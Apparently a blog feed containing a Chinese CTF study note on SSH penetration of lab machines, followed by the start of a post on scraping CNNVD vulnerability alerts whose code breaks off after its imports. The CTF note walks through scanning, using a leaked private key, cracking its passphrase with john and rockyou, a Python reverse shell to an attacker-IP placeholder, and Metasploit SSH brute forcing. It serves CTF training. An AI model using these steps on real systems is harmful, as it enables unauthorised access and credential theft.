<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF夺旗培训学习笔记</title>
      <link href="/2019/08/31/CTF%E5%A4%BA%E6%97%97%E5%9F%B9%E8%AE%AD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/08/31/CTF%E5%A4%BA%E6%97%97%E5%9F%B9%E8%AE%AD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>由于公司要派我和其他几个同事一起代表公司去参加一场CTF比赛，所以，就在网上找了一些资料来学习，在这里简单做下学习笔记。</p><a id="more"></a><h1 id="0x01-CTF简介"><a href="#0x01-CTF简介" class="headerlink" title="0x01 CTF简介"></a>0x01 CTF简介</h1><p>CTF是一-种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”, 也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式,率先从主办方给出的比赛环境中得到一-串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为”Flag”</p><p> CTF比赛中涉及内容比较繁杂，我们要利用所有可以利用的方法获得flag。</p><p>CTF比赛中，比赛环境有两种方式：<br>1.给与在同一局域网中的攻击机和靶场机器，以web方式可以访问攻击机，通过攻击机来渗透靶场机器，获取对应的Flag值；（一般情况下给与kali Linux作为攻击机，并且举办方提供计算机）<br>2.给与一个网线接口，用户自备工具，直接连接网线，进行渗透靶场机器，过去对应的flag值。</p><h1 id="0x02-CTF夺旗之SSH私钥泄露"><a href="#0x02-CTF夺旗之SSH私钥泄露" class="headerlink" title="0x02 CTF夺旗之SSH私钥泄露"></a>0x02 CTF夺旗之SSH私钥泄露</h1><h2 id="2-1-前期准备"><a href="#2-1-前期准备" class="headerlink" title="2.1 前期准备"></a>2.1 前期准备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r ip/network  # 发现主机</span><br><span class="line">ping ip   #测试连通性</span><br></pre></td></tr></table></figure><h2 id="2-2-信息探测"><a href="#2-2-信息探测" class="headerlink" title="2.2 信息探测"></a>2.2 信息探测</h2><p>每一个服务对应计算机的一个端口，用来进行通信。常用端口0~1023端口，在扫描结果中查找特殊端口，针对特殊端口进行探测，尤其对开放大端口的<code>http</code>服务进行排查</p><h2 id="2-4-探测大端口的信息"><a href="#2-4-探测大端口的信息" class="headerlink" title="2.4 探测大端口的信息"></a>2.4 探测大端口的信息</h2><p>对于开放<code>http</code>服务的大端口，可以采取<a href="http://ip:port/的形式访问。" target="_blank" rel="noopener">http://ip:port/的形式访问。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140123.png" class="lozad"></p><p>查看源代码获取对应信息，如果没有falg信息，使用工具探测隐藏页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://ip：port/  #对这个服务的隐藏文件进行探测。</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140139.png" class="lozad"></p><p>发现robots.txt敏感文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140232.png" class="lozad"></p><p>进一步对得到的信息进行探测</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140242.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140310.png" class="lozad"></p><h2 id="2-5-针对隐藏页面分析"><a href="#2-5-针对隐藏页面分析" class="headerlink" title="2.5 针对隐藏页面分析"></a>2.5 针对隐藏页面分析</h2><p>直接使用浏览器访问，查看效果，对应源代码，可能会获取到flag，或者下一步对应的提示；<br>挖掘ssh信息，不断访问获取更多泄露的ssh秘钥信息<br>下载id_ras,和authorized keys</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140621.png" class="lozad"></p><p>查看下载的两个秘钥文件信息,尝试使用秘钥登陆未能成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140635.png" class="lozad"></p><p>给id_rsa赋予读写权限</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141109.png" class="lozad"></p><blockquote><p>说明：600 == 110 000 000 == rw- — —</p></blockquote><h2 id="2-6-解密ssh秘钥信息"><a href="#2-6-解密ssh秘钥信息" class="headerlink" title="2.6 解密ssh秘钥信息"></a>2.6 解密ssh秘钥信息</h2><p>使用<code>ssh2john</code>将<code>id_isa</code>秘钥信息转换为<code>john</code>可以识别的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_isa</span><br><span class="line">ssh2john id_isa &gt; isacrack</span><br></pre></td></tr></table></figure><p>利用字典解密<code>isacrack</code>信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe -rules isacrack</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141556.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141644.png" class="lozad"></p><p>分析用户名、利用ssh登陆服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_isa 用户名@ssh靶场机器IP地址</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141656.png" class="lozad"></p><p>到这里已经登陆到主机，但是并不是root权限，该如何获取root权限尼？<br>答：深入探测根目录-</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141919.png" class="lozad"></p><p>查找具有root权限的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / - perm -4000 2 &gt; /dev/null</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142006.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142025.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142122.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142142.png" class="lozad"></p><h1 id="0x03-CTF夺旗之SSH服务渗透-拿到第一个用户权限"><a href="#0x03-CTF夺旗之SSH服务渗透-拿到第一个用户权限" class="headerlink" title="0x03. CTF夺旗之SSH服务渗透(拿到第一个用户权限)"></a>0x03. CTF夺旗之SSH服务渗透(拿到第一个用户权限)</h1><h2 id="3-1-ssh协议介绍"><a href="#3-1-ssh协议介绍" class="headerlink" title="3.1 ssh协议介绍"></a>3.1 ssh协议介绍</h2><p>SSH 未Secure Shell的缩写，有IETF的网络小组（Network Working Group）所定制：SSH未建立在应用层基础上的安全协议<br>SSH是目前较为可靠，专门为远程登录会话和其他网络服务提供安全性的协议，利用SSH协议可以有效防止远程管理过程中信息泄露的问题。<br>SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多个平台，几乎所有UNIX平台，Windows平台以及MAC平台，都可以运行SHH，它是基于TCP 22号端口的服务。</p><h2 id="3-2-SSH协议认证机制"><a href="#3-2-SSH协议认证机制" class="headerlink" title="3.2 SSH协议认证机制"></a>3.2 SSH协议认证机制</h2><ol><li><p>基于口令的安全验证<br>只要你自己知道账号和口令，就可以登陆到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想要的连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人” 这种方式的攻击。</p></li><li><p>基于秘钥的安全验证<br>需要依靠秘钥，也就是你必须为自己穿件一对秘钥，并把公钥放在需要访问的服务器上，如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的私有秘钥进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用秘钥，然后把它和你发送过来的私有秘钥进行比较。如果两个秘钥一致，则验证成功，登陆服务器。</p><blockquote><p>id_rsa就是尼的私钥，而id_rsa.pub则是你的公钥</p></blockquote></li></ol><h2 id="3-3-SSH协议验证机制弱点"><a href="#3-3-SSH协议验证机制弱点" class="headerlink" title="3.3 SSH协议验证机制弱点"></a>3.3 SSH协议验证机制弱点</h2><ol><li><p>基于口令的安全验证<br>基于字典的暴力破解，破解对应用户名和密码，通过SSH客户端连接到远程主机的SSH服务，实现对服务器的一定控制（不一定为root权限）</p></li><li><p>基于秘钥的安全验证<br>通过对主机信息收集，获取到泄露的用户名和对应的秘钥。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa 用户名@主机地址 登陆服务器。（不一定是root权限）</span><br></pre></td></tr></table></figure></li></ol><h2 id="3-4-信息探测"><a href="#3-4-信息探测" class="headerlink" title="3.4 信息探测"></a>3.4 信息探测</h2><p>对于给定IP地址的靶场机器，对其进行渗透测试，首先需要考虑靶场机器开放的服务。</p><ol><li><p>探测靶场开放的服务于服务版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 靶场IP地址</span><br></pre></td></tr></table></figure></li><li><p>探测靶场全部信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v 靶场IP地址</span><br></pre></td></tr></table></figure></li><li><p>探测靶场的操作系统类型与版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 靶场IP地址</span><br></pre></td></tr></table></figure></li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831151755.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831151813.png" class="lozad"></p><h2 id="3-5-分析探测结果"><a href="#3-5-分析探测结果" class="headerlink" title="3.5 分析探测结果"></a>3.5 分析探测结果</h2><p>对于SSH服务的22端口的靶场，首先考虑，</p><ol><li>暴力破解</li><li>私钥泄露（私钥有没有对应的密码、是否可以找到私钥的用户名）</li></ol><p>对于开放http服务的80端口或者其他端口的靶场,首先考虑:</p><ol><li>通过浏览器访问对应的靶场http服务，如http://靶场ip地址：http服务端口</li><li>使用探测工具对http的目录进行探测，如dirb http://靶场IP地址：http服务端口</li></ol><p><strong>特别注意特殊端口，如8080等大端口号。</strong></p><h2 id="3-6-挖掘敏感信息"><a href="#3-6-挖掘敏感信息" class="headerlink" title="3.6 挖掘敏感信息"></a>3.6 挖掘敏感信息</h2><p>使用浏览器对靶场ip的http服务探测，对页面种展示的内容也要注意，尤其是联系人等信息（有可能就是SSH的用户名信息），递归访问，力争把每一个dirb扫描到的目录页面都访问查看。<br>尤其对robotx.txt，以及一些目录进行访问，挖掘具备利用价值的信息。对于开放ssh服务的靶场，务必要注意是否可以寻找到SSH私钥信息（id_rsa）</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152536.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152554.png" class="lozad"></p><p>挖掘到私钥信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152607.png" class="lozad"></p><p>对于某些靶场，也可以使用nikto扫描器来挖掘敏感信息<br>nikto -host 靶场IP地址<br>特别注意config 等特殊敏感文件，要细读扫描的结果，挖掘可以利用的敏感信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152706.png" class="lozad"></p><h2 id="3-7-利用敏感、弱点信息"><a href="#3-7-利用敏感、弱点信息" class="headerlink" title="3.7 利用敏感、弱点信息"></a>3.7 利用敏感、弱点信息</h2><p>对挖掘到的SSH秘钥利用</p><ol><li><p>修改id_rsade 权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure></li><li><p>利用私钥登陆服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa 用户名@靶场IP地址</span><br></pre></td></tr></table></figure></li></ol><p><strong>注意：如果id_rsa没有解密密码，可以直接使用。但是如果id_rsa有机密密码，那么就需要进行对应的破解。</strong></p><p>使用wget远程下载靶机上的文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154141.png" class="lozad"></p><p>将权限修改为600权限</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154207.png" class="lozad"></p><p>尝试进行远程终端连接</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154235.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154313.png" class="lozad"></p><h2 id="3-8-扩大战果"><a href="#3-8-扩大战果" class="headerlink" title="3.8 扩大战果"></a>3.8 扩大战果</h2><p>登陆服务器之后，我们需要做一下操作：</p><ol><li>查看当前用户whoami</li><li>id 查看当前用户的权限</li><li>查看根目录寻找flag文件,如果是root权限，那么表明这个靶场就被全部拿下，但是如果不时，就肯定需要提权。一般情况下，flag文件只属于root用户和对应的用户组。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd  //查看所有用户的列表</span><br><span class="line">cat /etc/group  //查看用户组</span><br><span class="line">find / -user 用户名  //查看属于某些用户的文件</span><br><span class="line">/tmp   //查看缓存文件目录</span><br></pre></td></tr></table></figure><h2 id="3-9-深入挖掘"><a href="#3-9-深入挖掘" class="headerlink" title="3.9 深入挖掘"></a>3.9 深入挖掘</h2><p>通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务。<br>cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对靶场机器的某个文件。<br>如果在/etc/crontab 下有某个用户的定时计划文件，但是具体目录下没有这个定时执行文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。<br>如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否有读写权限。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831155105.png" class="lozad"></p><h2 id="3-10-反弹shell"><a href="#3-10-反弹shell" class="headerlink" title="3.10 反弹shell"></a>3.10 反弹shell</h2><p>靶场代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#！/usr/bin/python  ##环境变量的书写</span><br><span class="line">import os,subprocess,socket #导入第三方库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socekt(socket.AF_INET,socket.SOCK_STREAM) #创建套接字</span><br><span class="line">s.connect(&quot;攻击机ip地址&quot;,&quot;攻击机监听端口&quot;) #利用套接字连接到攻击机的ip地址，以及攻击机监听的端口号</span><br><span class="line"></span><br><span class="line">#将标准输入输出，以及错误输入输出</span><br><span class="line">os.dup2(s.fileno(),0) </span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure><p>攻击机<code>netcat</code>命令：<code>nc -lpv 未占用端口</code></p><blockquote><p>说明：</p><p>l 表示监听模式</p><p>P 表示端口号</p><p>v 表示返回详细信息</p></blockquote><p>查看占用端口<code>netstat -pantu</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831155609.png" class="lozad"></p><h2 id="3-11-背水一战"><a href="#3-11-背水一战" class="headerlink" title="3.11 背水一战"></a>3.11 背水一战</h2><p>万不得已的时候只能对ssh服务进行暴力破解。破解最后一个用户名。破解工具如hydra、medusa等</p><p>利用cupp创建字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jeanphorn/common-password.git</span><br><span class="line">chmod +x cupp.py</span><br><span class="line">./cupp.py -i #以交互的方式创建字典</span><br></pre></td></tr></table></figure><h2 id="3-12-使用metasploit破解SSH"><a href="#3-12-使用metasploit破解SSH" class="headerlink" title="3.12 使用metasploit破解SSH"></a>3.12 使用metasploit破解SSH</h2><p>在终端输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf&gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(ssh_login)&gt;set rhosts 192.168.1.137</span><br><span class="line">msf auxiliary(ssh_login)&gt;set username hadi</span><br><span class="line">msf auxiliary(ssh_login)&gt;set pass_file hadi.txt</span><br><span class="line">msf auxiliary(ssh_login)&gt;run</span><br></pre></td></tr></table></figure><p>优化会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c “import pty;pty.spqwn(&apos;/bin/bash&apos;)”</span><br><span class="line">su - root</span><br></pre></td></tr></table></figure><blockquote><p>注：暴力破解ssh可以使用超级弱口令工具，支持爆破SSH,FTP,MYSQL等弱口令，Windows版本。</p><p>GitHub地址：<a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a></p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831231712.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831231727.png" class="lozad"></p><h2 id="3-13-获取Flag"><a href="#3-13-获取Flag" class="headerlink" title="3.13 获取Flag"></a>3.13 获取Flag</h2><p>提升到root权限之后，切换目录寻找flag文件。一般情况下，flag文件是在root目录下。<br>cat flag文件名（一般情况 flag.txt）</p><h2 id="3-14-总结"><a href="#3-14-总结" class="headerlink" title="3.14 总结"></a>3.14 总结</h2><p>在对SSH服务渗透中，大部分情况是利用获取的私钥文件，直接使用用户名和私钥文件登陆靶场机器，个别情况进行暴力破解获取用户密码，通过用户名和对应用户登陆靶场机。<br>CTF中要特别注意 /tmp数据缓冲目录 以及 /etc/crontab 设置定时之行文件</p><h1 id="0x04-CTF夺旗之SMB信息泄露"><a href="#0x04-CTF夺旗之SMB信息泄露" class="headerlink" title="0x04 CTF夺旗之SMB信息泄露"></a>0x04 CTF夺旗之SMB信息泄露</h1><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 夺旗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬取CNNVD上的漏洞预警</title>
      <link href="/2019/08/30/%E7%88%AC%E5%8F%96CNNVD%E4%B8%8A%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/"/>
      <url>/2019/08/30/%E7%88%AC%E5%8F%96CNNVD%E4%B8%8A%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>由于公司原因，本人出差一周，在出差的工作任务有记录CNNVD漏洞预警这项任务，而这样任务简直就是重复造轮子的任务，Ctrl + C ，Ctrl + V ，毫无技术含量不说，还会浪费很多时间，so，我想用爬虫来解决，但是，我又不会写，哈哈，那就百度喽。幸运的是，在百度上找到了爬虫的源码。</p><p><img alt data-src="https://img02.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-2857e2f09ca9e0a0-a458d10c6b7a1d65b27c80fba9904fa9.jpg" class="lozad"></p><a id="more"></a><h1 id="0x01-开搞"><a href="#0x01-开搞" class="headerlink" title="0x01 开搞"></a>0x01 开搞</h1><blockquote><p>环境需求：</p><ol><li><p>python 3.x 版本</p></li><li><p>若干第三方模块</p></li></ol></blockquote><h2 id="1-1-python代码"><a href="#1-1-python代码" class="headerlink" title="1.1 python代码"></a>1.1 python代码</h2><p>首先先放出代码，这个代码是在百度上找的，我觉得最好的一个代码了，可以自定义爬行的时间范围和页数，真牛X。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr</span></span><br><span class="line"><span class="comment">#import urllib.request/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> http.cookiejar</span><br><span 